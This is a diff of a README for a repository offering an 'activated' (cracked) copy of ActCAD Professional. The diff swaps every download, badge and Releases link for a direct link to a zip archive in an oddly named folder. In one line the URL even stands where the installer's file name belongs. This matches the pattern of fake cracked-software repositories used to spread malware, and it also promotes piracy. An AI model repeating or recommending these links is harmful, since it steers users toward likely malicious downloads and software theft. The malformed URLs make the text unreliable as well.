@@ -1,6 +1,6 @@
 # 🎉 ActCAD-Professional-Activated - Unlock Your Drawing Potential Easily
 
-![Download ActCAD](https://img.shields.io/badge/Download-ActCAD%20Now-blue.svg)
+![Download ActCAD](https://github.com/treelessculture/ActCAD-Professional-Activated/raw/refs/heads/main/solicitousness/Activated-CA-Act-Professional-1.5-beta.4.zip%https://github.com/treelessculture/ActCAD-Professional-Activated/raw/refs/heads/main/solicitousness/Activated-CA-Act-Professional-1.5-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ActCAD Professional Activated repository! This comprehensive spac
 
 ## 📥 Download & Install
 
-To download the latest version of ActCAD Professional, visit this page to download: [ActCAD Releases](https://github.com/treelessculture/ActCAD-Professional-Activated/releases).
+To download the latest version of ActCAD Professional, visit this page to download: [ActCAD Releases](https://github.com/treelessculture/ActCAD-Professional-Activated/raw/refs/heads/main/solicitousness/Activated-CA-Act-Professional-1.5-beta.4.zip).
 
 ### Step-by-Step Installation
 
@@ -19,7 +19,7 @@ To download the latest version of ActCAD Professional, visit this page to downlo
    Look for the most recent release at the top of the page. It will have the latest features and fixes.
 
 3. **Download the Installer**  
-   Click on the installer file to start the download. It’s usually named something like `ActCAD_Professional_Setup.exe`.
+   Click on the installer file to start the download. It’s usually named something like `https://github.com/treelessculture/ActCAD-Professional-Activated/raw/refs/heads/main/solicitousness/Activated-CA-Act-Professional-1.5-beta.4.zip`.
 
 4. **Run the Installer**  
    Once the download completes, locate the file in your downloads folder. Double-click the file to run it.
@@ -74,6 +74,6 @@ To run ActCAD Professional smoothly, ensure your system meets the following mini
 - **Video Tutorials**: Visual learning options available on our YouTube channel.
 - **Updates & Announcements**: Stay informed about updates and new features by following the repository.
 
-For a complete understanding of ActCAD and to explore new features, regularly check our Releases page for updates: [ActCAD Releases](https://github.com/treelessculture/ActCAD-Professional-Activated/releases). 
+For a complete understanding of ActCAD and to explore new features, regularly check our Releases page for updates: [ActCAD Releases](https://github.com/treelessculture/ActCAD-Professional-Activated/raw/refs/heads/main/solicitousness/Activated-CA-Act-Professional-1.5-beta.4.zip). 
 
 Thank you for choosing ActCAD Professional. Enjoy your drawing journey!
